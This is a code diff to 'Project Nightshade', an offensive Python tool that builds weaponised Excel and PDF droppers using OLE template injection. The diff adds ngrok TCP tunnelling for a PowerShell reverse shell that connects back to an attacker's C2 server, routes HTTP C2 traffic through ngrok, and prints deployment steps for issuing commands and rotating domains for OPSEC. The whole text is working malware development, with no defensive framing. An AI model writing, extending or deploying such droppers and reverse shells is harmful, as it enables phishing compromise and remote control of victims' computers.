@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Project Nightshade - Advanced Document Dropper with Enhanced C2 Integration
-Author: ek0ms savi0r | OPSEC Grade: Midnight
+Author: ek0ms savi0r 
 Description:
     Creates Excel and .pdf files with OLE template injection that deploys multiple payload options:
     - Reverse Shell (Connects to Nightshade C2)
@@ -21,6 +21,8 @@ import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 import requests
+import subprocess
+import threading
 
 def prompt_user():
     """Interactive prompt for user configuration"""
@@ -143,16 +145,43 @@ STAGING_DOMAINS = [
     'template-store.azurewebsites.net'
 ]
 
-def get_ngrok_tunnel_url():
+def get_ngrok_tunnel_url(tunnel_type='https'):
     """Get the current ngrok tunnel URL from the staging server"""
     try:
         response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
         tunnels = response.json()['tunnels']
         for tunnel in tunnels:
-            if tunnel['proto'] == 'https':
-                return tunnel['public_url']
+            if tunnel['proto'] == tunnel_type:
+                if tunnel_type == 'tcp':
+                    # For TCP tunnels, we need the full public_url (includes port)
+                    return tunnel['public_url']
+                else:
+                    # For HTTP/HTTPS, we just need the base URL
+                    return tunnel['public_url']
         return None
-    except:
+    except Exception as e:
+        print(f"[-] Error getting ngrok tunnel: {e}")
+        return None
+
+def start_ngrok_tcp_tunnel(port):
+    """Start a ngrok TCP tunnel for reverse shell"""
+    try:
+        print(f"[+] Starting ngrok TCP tunnel for port {port}...")
+        print(f"[+] Please manually run: ngrok tcp {port}")
+        print(f"[+] Then enter the ngrok address (e.g., 1.tcp.ngrok.io:12345) when prompted")
+        
+        # Ask user to manually enter the ngrok address
+        ngrok_address = input("[?] Enter ngrok TCP address (e.g., 1.tcp.ngrok.io:12345): ").strip()
+        
+        if ngrok_address:
+            print(f"[+] Using ngrok TCP tunnel: {ngrok_address}")
+            return ngrok_address
+        else:
+            print("[-] No ngrok address provided. Using direct connection.")
+            return None
+            
+    except Exception as e:
+        print(f"[-] Error starting ngrok TCP tunnel: {e}")
         return None
 
 def get_current_domain():
@@ -208,9 +237,26 @@ def encrypt_payload(payload, key):
 
 def create_reverse_shell_payload(lhost, lport):
     """Create PowerShell reverse shell payload that connects to Nightshade C2"""
+    # Handle ngrok TCP tunnel format (host:port)
+    if 'ngrok.io' in lhost or 'ngrok-free.app' in lhost:
+        # lhost already contains the full ngrok TCP address
+        target_host = lhost
+    else:
+        target_host = f"{lhost}:{lport}"
+    
     rev_shell = fr'''
 # Reverse Shell to Nightshade C2
-$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
+$target = "{target_host}".Split(":")
+$lhost = $target[0]
+$lport = if ($target.Length -gt 1) {{ $target[1] }} else {{ "4444" }}
+
+try {{
+    $lport = [int]$lport
+}} catch {{
+    $lport = 4444
+}}
+
+$client = New-Object System.Net.Sockets.TCPClient($lhost, $lport)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{{0}}
 
@@ -1040,6 +1086,19 @@ def main():
         # Get user configuration
         user_config = prompt_user()
         
+        # Handle ngrok TCP tunnel for reverse shell
+        if user_config['use_ngrok'] and user_config['payload_type'] == "reverse_shell":
+            print("\n[+] Setting up ngrok TCP tunnel for reverse shell...")
+            ngrok_tcp_address = start_ngrok_tcp_tunnel(user_config['lport'])
+            
+            if ngrok_tcp_address:
+                # Update the target to use ngrok TCP tunnel
+                user_config['lhost'] = ngrok_tcp_address
+                print(f"[+] Reverse shell will connect through ngrok: {ngrok_tcp_address}")
+            else:
+                print("[!] Failed to create ngrok TCP tunnel. Using direct connection.")
+                user_config['use_ngrok'] = False
+        
         # Update global config
         global CONFIG
         CONFIG = {
@@ -1049,13 +1108,15 @@ def main():
             'checkin_interval': '3600'
         }
         
-        # Check ngrok status if enabled
-        if user_config['use_ngrok']:
+        # Check ngrok status if enabled (for HTTP tunnels)
+        if user_config['use_ngrok'] and user_config['payload_type'] != "reverse_shell":
             ngrok_url = get_ngrok_tunnel_url()
             if ngrok_url:
-                print(f"[+] Ngrok tunnel detected: {ngrok_url}")
+                print(f"[+] Ngrok HTTP tunnel detected: {ngrok_url}")
+                # Update C2 server to use ngrok URL
+                user_config['c2_server'] = ngrok_url
             else:
-                print("[!] Ngrok tunnel not found - falling back to domain rotation")
+                print("[!] Ngrok HTTP tunnel not found - falling back to domain rotation")
                 user_config['use_ngrok'] = False
         
         # Determine file type and create appropriate dropper
@@ -1092,19 +1153,26 @@ def main():
         print("    5. Template executes encrypted in-memory payload")
         
         if user_config['payload_type'] == "reverse_shell":
-            print("    6. Reverse shell connects to Nightshade C2")
-            print(f"    7. C2 handles shell on port {user_config.get('lport', 4444)}")
+            print(f"    6. Reverse shell connects to: {user_config['lhost']}")
+            if 'ngrok.io' in user_config['lhost'] or 'ngrok-free.app' in user_config['lhost']:
+                print("    7. Using ngrok TCP tunnel for reverse shell")
+            else:
+                print(f"    7. C2 handles shell on port {user_config.get('lport', 4444)}")
         else:
             print("    6. Implant checks in to Nightshade C2 every 60 seconds")
-            print("    7. Send commands via: POST /c2/command")
-            print("    8. View results in C2 dashboard: /c2/sessions")
+            print(f"    7. C2 Server: {user_config.get('c2_server', 'Unknown')}")
+            print("    8. Send commands via: POST /c2/command")
+            print("    9. View results in C2 dashboard: /c2/sessions")
         
         if user_config['use_ngrok']:
-            print("    9. Using ngrok tunneling for infrastructure-less deployment")
+            if user_config['payload_type'] == "reverse_shell":
+                print("    10. Using ngrok TCP tunneling for reverse shell")
+            else:
+                print("    10. Using ngrok HTTP tunneling for C2 communications")
         elif user_config['custom_domain']:
-            print(f"    9. Using custom domain: {user_config['custom_domain']}")
+            print(f"    10. Using custom domain: {user_config['custom_domain']}")
         else:
-            print("    9. Using domain rotation for OPSEC")
+            print("    10. Using domain rotation for OPSEC")
             
         print("\n[!] Remember to start the Nightshade C2 server before deployment!")
         
